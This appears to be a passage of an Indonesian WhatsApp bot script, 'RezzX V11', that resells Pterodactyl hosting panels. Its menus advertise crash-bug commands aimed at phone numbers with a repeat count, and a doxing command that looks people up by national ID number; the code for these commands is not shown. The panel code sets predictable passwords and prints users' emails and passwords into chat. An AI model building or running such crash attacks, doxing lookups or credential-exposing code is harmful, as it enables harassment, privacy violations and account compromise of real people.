${global.rezz1} NOMOR OWNERKU :@${owner.split("@")[0]}
${global.rezz1} VERSI SCRIPT SAAT INI : V11
${global.rezz1} RUNTIME : ${runtime(process.uptime())}

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

${global.rezz1} createpanel 1-15gb
*CONTOH*
${prefix}1gb rezz,62812345678

${global.rezz1} ${prefix}linklogin
${global.rezz1} ${prefix}listsrv

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

Script By © Rezz X Hyren4k
Powered by RezzX V11

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
`

           rezzx.sendMessage(m.chat, { 
	           text: menu,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: global.imageurl,
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fkontak
                    })
     await rezzx.sendMessage(m.chat, {
                        audio: fs.readFileSync('./all/menu.mp3'),
                        mimetype: 'all/menu.mp3',
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
             break

case 'adpmenu': case 'adminpanelmenu': case 'adminmenu': {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const menu = `Hai tod  Version Script Ini V11
Dan dibuat Oleh RezzX Collaborasi dengan Hyren4k



${global.rezz1} NAMA BOT : ${namabot}
${global.rezz1} NAMA OWNER : ${rezzown}
${global.rezz1} NOMOR OWNERKU :@${owner.split("@")[0]}
${global.rezz1} VERSI SCRIPT SAAT INI : V11
${global.rezz1}RUNTIME : ${runtime(process.uptime())}



${global.rezz1} ${prefix}listusr
${global.rezz1} ${prefix}delusr ( idnya contoh 1 )
${global.rezz1} ${prefix}delsrv ( idnya contoh 1 )



Script By � Rezz X Hyren4k
Powered by RezzX V11

`

           rezzx.sendMessage(m.chat, { 
	           text: menu,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: global.imageurl,
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fkontak
                    })
     await rezzx.sendMessage(m.chat, {
                        audio: fs.readFileSync('./all/menu.mp3'),
                        mimetype: 'all/menu.mp3',
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
             break

case 'ownermenu': case 'menuowner': {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const menu = `Hai tod  Version Script Ini V11
Dan dibuat Oleh RezzX Collaborasi dengan Hyren4k



${global.rezz1} NAMA BOT : ${namabot}
${global.rezz1} NAMA OWNER : ${rezzown}
${global.rezz1} NOMOR OWNERKU :@${owner.split("@")[0]}
${global.rezz1} VERSI SCRIPT SAAT INI : V11
${global.rezz1}RUNTIME : ${runtime(process.uptime())}



${global.rezz1} ${prefix}addprrem _628xx/@628xx_
${global.rezz1} ${prefix}addowner _628xx/@628xx_
${global.rezz1} ${prefix}delprem _628xx/@628xx_
${global.rezz1} ${prefix}delown _628xx/@628xx_



Script By � Rezz X Hyren4k
Powered by RezzX V11

`

           rezzx.sendMessage(m.chat, { 
	           text: menu,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: global.imageurl,
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fkontak
                    })
     await rezzx.sendMessage(m.chat, {
                        audio: fs.readFileSync('./all/menu.mp3'),
                        mimetype: 'all/menu.mp3',
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
             break

case 'doxmenu': case 'menudox': {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const menu = `Hai tod  Version Script Ini V11
Dan dibuat Oleh RezzX Collaborasi dengan Hyren4k

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

${global.rezz1} NAMA BOT : ${namabot}
${global.rezz1} NAMA OWNER : ${rezzown}
${global.rezz1} NOMOR OWNERKU :@${owner.split("@")[0]}
${global.rezz1} VERSI SCRIPT SAAT INI : V11
${global.rezz1}RUNTIME : ${runtime(process.uptime())}

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

${global.rezz1} ${prefix}dox _nik kknya 1628585xxxxxx_
${global.rezz1} ${prefix}tutordox

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

Script By � Rezz X Hyren4k
Powered by RezzX V11

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
`

           rezzx.sendMessage(m.chat, { 
	           text: menu,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: global.imageurl,
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fkontak
                    })
     await rezzx.sendMessage(m.chat, {
                        audio: fs.readFileSync('./all/menu.mp3'),
                        mimetype: 'all/menu.mp3',
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
             break

case 'bugmenu': case 'menubug': {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const menu = `Hai tod  Version Script Ini V11
Dan dibuat Oleh RezzX Collaborasi dengan Hyren4k

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

${global.rezz1} NAMA BOT : ${namabot}
${global.rezz1} NAMA OWNER : ${rezzown}
${global.rezz1} NOMOR OWNERKU :@${owner.split("@")[0]}
${global.rezz1} VERSI SCRIPT SAAT INI : V11
${global.rezz1}RUNTIME : ${runtime(process.uptime())}

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

${global.rezz1} ${prefix}rezz-mode-gacor 628xxx|jumlah
${global.rezz1} ${prefix}hyren4k 628xxxx|jumlah
${global.rezz1} ${prefix}samsungcrash 628xxx|jumlah
${global.rezz1} ${prefix}rezzxvip 628xxx|jumlah
${global.rezz1} ${prefix}tembusipong 628xxx|jumlah
${global.rezz1} ${prefix}sendpeler 628xxx|jumlah
${global.rezz1} ${prefix}rezzxhyren 628xxx|jumlah

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

Script By � Rezz X Hyren4k
Powered by RezzX V11

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
`

           rezzx.sendMessage(m.chat, { 
	           text: menu,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: global.imageurl,
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fkontak
                    })
     await rezzx.sendMessage(m.chat, {
                        audio: fs.readFileSync('./all/menu.mp3'),
                        mimetype: 'all/menu.mp3',
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
             break

case 'thanksto': case 'tqto': {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const menu = `Hai tod  
BERIKUT NAMA TQTO REZZX
TERIMAKASIH ATAS SUPPORTNYA GW GA TAU APA LAGI
POKOKNYA TERIMAKASIH BANYAK KEPADA KALIAN

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

*THANKS TO* : 

-Tuhan Maha esa
-orang tua
-my friend di kkr ( kawan kawan RezzX )
-my team rco-vx-not x agency
-RezzX Dev Script
-Nerok Kang Vipies
-Radzz My Partner the best
-Raihanmltr My friends
-All kawan kawan RezzX
-my team botz
-all developer Script
-all team botz wa
-pengikut Ch RezzX

Terima kasih atas dukungan/supportnya

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

Script By � Rezz X Hyren4k
Powered by RezzX V11

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
`

           rezzx.sendMessage(m.chat, { 
	           text: menu,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: global.imageurl,
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fkontak
                    })
     await rezzx.sendMessage(m.chat, {
                        audio: fs.readFileSync('./all/menu.mp3'),
                        mimetype: 'all/menu.mp3',
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
             break

case 'allmenu': {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const menu = `Hai tod  Version Script Ini V11
Dan dibuat Oleh RezzX Collaborasi dengan Hyren4k

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

${global.rezz1} NAMA BOT : ${namabot}
${global.rezz1} NAMA OWNER : ${rezzown}
${global.rezz1} NOMOR OWNERKU :@${owner.split("@")[0]}
${global.rezz1} VERSI SCRIPT SAAT INI : V11
${global.rezz1}RUNTIME : ${runtime(process.uptime())}

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

*RESELLER MENU*

${global.rezz1} createpanel 1-15gb
*CONTOH*
${prefix}1gb rezz,62812345678

${global.rezz1} ${prefix}linklogin
${global.rezz1} ${prefix}listsrv

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

*ADMIN PANEL MENU*

${global.rezz1} ${prefix}listusr
${global.rezz1} ${prefix}delusr ( idnya contoh 1 )
${global.rezz1} ${prefix}delsrv ( idnya contoh 1 )

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

*BUG MENU*

${global.rezz1} ${prefix}rezz-mode-gacor 628xxx|jumlah
${global.rezz1} ${prefix}hyren4k 628xxxx|jumlah
${global.rezz1} ${prefix}samsungcrash 628xxx|jumlah
${global.rezz1} ${prefix}rezzxvip 628xxx|jumlah
${global.rezz1} ${prefix}tembusipong 628xxx|jumlah
${global.rezz1} ${prefix}sendpeler 628xxx|jumlah
${global.rezz1} ${prefix}rezzxhyren 628xxx|jumlah

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

*DOXING MENU*

${global.rezz1} ${prefix}dox _nik kknya 1628585xxxxxx_
${global.rezz1} ${prefix}tutordox

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

*OWNER MENU*

${global.rezz1} ${prefix}addprrem _628xx/@628xx_
${global.rezz1} ${prefix}addowner _628xx/@628xx_
${global.rezz1} ${prefix}delprem _628xx/@628xx_
${global.rezz1} ${prefix}delown _628xx/@628xx_

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

*THANKS TO* : 

-Tuhan Maha esa
-orang tua
-my friend di kkr ( kawan kawan RezzX )
-my team rco-vx-not x agency
-RezzX Dev Script
-Nerok Kang Vipies
-Radzz My Partner the best
-Raihanmltr My friends
-All kawan kawan RezzX
-my team botz
-all developer Script
-all team botz wa
-pengikut Ch RezzX

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

Script By � Rezz X Hyren4k
Powered by RezzX V11

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
`

           rezzx.sendMessage(m.chat, { 
	           text: menu,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: global.imageurl,
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fkontak
                    })
     await rezzx.sendMessage(m.chat, {
                        audio: fs.readFileSync('./all/menu.mp3'),
                        mimetype: 'all/menu.mp3',
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
             break

//======= BAGIAN PANELNYA=======//

                           case "listusr": {
  if (!isOwner) return reply(mess.only.premium)
  let s = server.attributes;
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `Name: ${u.username}\n`;
    messageText += `Server: ${s.owned}\n`;
    messageText += `DLL: ${u.email} ${u.password}\n\n`;
    
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await rezzx.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break
                        case "listsrv": {
  if (!isPremium) return reply(`Khusus Orang Langganan Reseller Rezz Tod`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await rezzx.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
        case "delsrv": {
      if (!isOwner) return reply(`KHUSUS OWN `)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
        break
case "1gb": {
    if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "1GB"
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "30"
let disk = "1024"
let email = username + "rezz@rezzx.com"
akunlo = "https://telegra.ph/file/2615d843415604e717885.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`

 *DONE CRATE USER + SERVER ID :* ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain}

NOTE :
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*DONE AKUN PANEL ANDA BERHASIL DI BUAT SILAHKAN CEK DI NOMOR TERSEBUT✅*
`)

}

break
case "2gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "2GB"
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "60"
let disk = "2048"
let email = username + "rezz@rezzx.com"
akunlo = "https://telegra.ph/file/2615d843415604e717885.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUKSES MEMBUAT PANEL , DATA AKAN DIKIRIMKAN LEWAT PRIBADI`)
ctf = `Hai @${u.split`@`[0]}

 -> USERNAME* : ${user.username}
 -> PASSWORD* : ${password}
 - > LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "3gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "3GB"
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "80"
let disk = "3072"
let email = username + "rezz@rezzx.com"
akunlo = "https://telegra.ph/file/2615d843415604e717885.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUKSES MEMBUAT PANEL , DATA AKAN DIKIRIMKAN LEWAT PRIBADI`)
ctf = `Hai @${u.split`@`[0]}

 -> USERNAME* : ${user.username}
 -> PASSWORD* : ${password}
 - > LOGIN* : ${domain}

NOTE :
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "4gb": {
    if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "4"
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "100"
let disk = "4000"
let email = username + "rezz@rezzx.com"
akunlo = "https://telegra.ph/file/2615d843415604e717885.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUKSES MEMBUAT PANEL , DATA AKAN DIKIRIMKAN LEWAT PRIBADI`)
ctf = `Hai @${u.split`@`[0]}

 -> USERNAME* : ${user.username}
 -> PASSWORD* : ${password}
 - > LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "unli": {
    if (!isOwner) return reply(`Jan Cret Unli Pepek🗿`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "rezz"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "666@rezzx.com"
akunlo = "https://telegra.ph/file/2615d843415604e717885.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUKSES MEMBUAT PANEL , DATA AKAN DIKIRIMKAN LEWAT PRIBADI`)
ctf = `Hai @${u.split`@`[0]}

 -> USERNAME* : ${user.username}
 -> PASSWORD* : ${password}
 - > LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "5gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
